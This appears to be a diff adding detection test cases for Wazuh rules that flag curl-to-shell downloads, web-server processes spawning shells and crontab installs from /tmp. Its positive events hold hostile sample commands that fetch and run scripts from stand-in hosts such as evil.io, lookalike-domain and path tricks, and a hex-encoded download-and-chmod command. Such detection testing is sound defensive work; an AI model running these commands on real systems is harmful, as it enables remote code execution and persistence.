@@ -698,3 +698,152 @@
     - {event: 'type=SYSCALL msg=audit(1767225600.306:306): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4201 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="id" exe="/usr/bin/id" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.306:306): argc=1 a0="id" type=CWD msg=audit(1767225600.306:306): cwd="/root"', location: /var/log/audit/l5-two-b/audit.log}
     - {event: 'type=SYSCALL msg=audit(1767225600.307:307): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4202 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="uname" exe="/usr/bin/uname" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.307:307): argc=1 a0="uname" type=CWD msg=audit(1767225600.307:307): cwd="/root"', location: /var/log/audit/l5-two-b/audit.log}
     - {event: 'type=SYSCALL msg=audit(1767225600.308:308): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4203 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="hostname" exe="/usr/bin/hostname" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.308:308): argc=1 a0="hostname" type=CWD msg=audit(1767225600.308:308): cwd="/root"', location: /var/log/audit/l5-two-b/audit.log}
+
+# ---------------------------------------------------------------- sửa sau rà soát 19/11/2026
+- rule: 102003   # LNX-003: tên miền giả get.docker.com.evil.io (allowlist trước 19/11 không neo)
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=bash exe=/usr/bin/sh cmd=curl -fsSL https://get.docker.com.evil.io/x | sh'
+- rule: 102003   # LNX-003: ://get.docker.com nằm trong query của URL độc
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=bash exe=/usr/bin/sh cmd=curl -fsSL https://evil.io/x.sh?r=https://get.docker.com | sh'
+- rule: 102003   # LNX-003: đường dẫn nvm-sh/nvm/../.. (curl rút gọn dot-segment thành repo khác)
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=bash parent=bash exe=/usr/bin/bash cmd=curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm/../../attacker/repo/main/x.sh | bash'
+- rule: 102003   # LNX-003: | sudo bash
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=bash parent=bash exe=/usr/bin/bash cmd=curl -fsSL https://evil.io/x.sh | sudo bash'
+- rule: 102003   # LNX-003: | sudo -E bash
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=bash parent=bash exe=/usr/bin/bash cmd=curl -fsSL https://evil.io/x.sh | sudo -E bash -s'
+- rule: 102003   # LNX-003: | /bin/bash
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=bash parent=bash exe=/usr/bin/bash cmd=wget -qO- https://evil.io/x.sh | /bin/bash'
+- rule: 102003   # LNX-003: bash -c "$(curl ...)"
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=bash parent=bash exe=/usr/bin/bash cmd=bash -c "$(curl -fsSL https://evil.io/x.sh)"'
+- rule: 102003   # LNX-003: bash <(curl ...)
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=bash parent=bash exe=/usr/bin/bash cmd=bash <(curl -fsSL https://evil.io/x.sh)'
+- rule: 102003   # LNX-003: bộ cài Docker thật rồi nối thêm lệnh tải độc
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=bash exe=/usr/bin/sh cmd=curl -fsSL https://get.docker.com | sh; curl -s https://evil.io/y | sh'
+- none:   # LNX-003 âm: kiểm tra checksum (| sha256sum), trước 19/11 báo nhầm
+  - 102003
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sha256sum parent=bash exe=/usr/bin/sha256sum cmd=curl -fsSL https://example.com/f.tgz | sha256sum'
+- none:   # LNX-003 âm: | shasum -a 256
+  - 102003
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=shasum parent=bash exe=/usr/bin/shasum cmd=wget -qO- https://example.com/f.tgz | shasum -a 256'
+- none:   # LNX-003 âm: | shellcheck -
+  - 102003
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=shellcheck parent=bash exe=/usr/bin/shellcheck cmd=curl -s https://example.com/install.sh | shellcheck -'
+- none:   # LNX-003 âm: lệnh cài rustup chính thức
+  - 102003
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=bash exe=/usr/bin/sh cmd=curl --proto ''=https'' --tlsv1.2 -sSf https://sh.rustup.rs | sh'
+- none:   # LNX-003 âm: lệnh cài Homebrew chính thức
+  - 102003
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=bash parent=bash exe=/usr/bin/bash cmd=/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'
+- none:   # LNX-003 âm: lệnh cài Oh My Zsh chính thức
+  - 102003
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=bash exe=/usr/bin/sh cmd=sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"'
+- none:   # LNX-003 âm: $(curl) gán biến, không chạy qua shell
+  - 102003
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=bash parent=bash exe=/usr/bin/bash cmd=IP=$(curl -s https://ifconfig.me)'
+- none:   # LNX-002 âm: Jenkins (java) chạy sh (bỏ cha java 19/11)
+  - 102002
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=java exe=/usr/bin/sh cmd=sh -c git fetch --tags origin'
+- none:   # LNX-002 âm: mail() của PHP: php-fpm sinh sh -c sendmail
+  - 102002
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=php-fpm exe=/usr/bin/sh cmd=sh -c /usr/sbin/sendmail -t -i'
+- none:   # LNX-002 âm: mail() của PHP trên php-fpm8.2
+  - 102002
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=php-fpm8.2 exe=/usr/bin/sh cmd=sh -c /usr/sbin/sendmail -t -i -f www@example.com'
+- rule: 102002   # LNX-002: php-fpm8.2 (hậu tố phiên bản) sinh whoami
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=whoami parent=php-fpm8.2 exe=/usr/bin/whoami cmd=whoami'
+- rule: 102002   # LNX-002: sendmail nối thêm lệnh vẫn báo
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=php-fpm exe=/usr/bin/sh cmd=sh -c /usr/sbin/sendmail -t; id'
+- rule: 102006   # LNX-006: crontab cài từ file /tmp không có tùy chọn
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=crontab parent=bash exe=/usr/bin/crontab cmd=crontab /tmp/evil.cron'
+- rule: 102006   # LNX-006: crontab -u root /tmp/x
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=crontab parent=bash exe=/usr/bin/crontab cmd=crontab -u root /tmp/x'
+- none:   # LNX-006 âm: crontab -l (chỉ liệt kê)
+  - 102006
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=crontab parent=bash exe=/usr/bin/crontab cmd=crontab -l'
+- rule: 102503   # LNX-003 auditd: -o/tmp không có dấu cách (regex cũ 20? bỏ sót)
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.951:951): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4951 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="sh" exe="/usr/bin/sh" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.951:951): argc=3 a0="sh" a1="-c" a2=6375726C202D6F2F746D702F7820687474703A2F2F3230332E302E3131332E352F782026262063686D6F64202B78202F746D702F78 type=CWD msg=audit(1767225600.951:951): cwd="/root"'
+- rule: 102506   # LNX-006 auditd: crontab /tmp/evil.cron (không tùy chọn)
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.952:952): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4952 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="crontab" exe="/usr/bin/crontab" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.952:952): argc=2 a0="crontab" a1="/tmp/evil.cron" type=CWD msg=audit(1767225600.952:952): cwd="/root"'
+- none:   # LNX-006 auditd âm: crontab -l
+  - 102506
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.953:953): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4953 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="crontab" exe="/usr/bin/crontab" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.953:953): argc=2 a0="crontab" a1="-l" type=CWD msg=audit(1767225600.953:953): cwd="/root"'
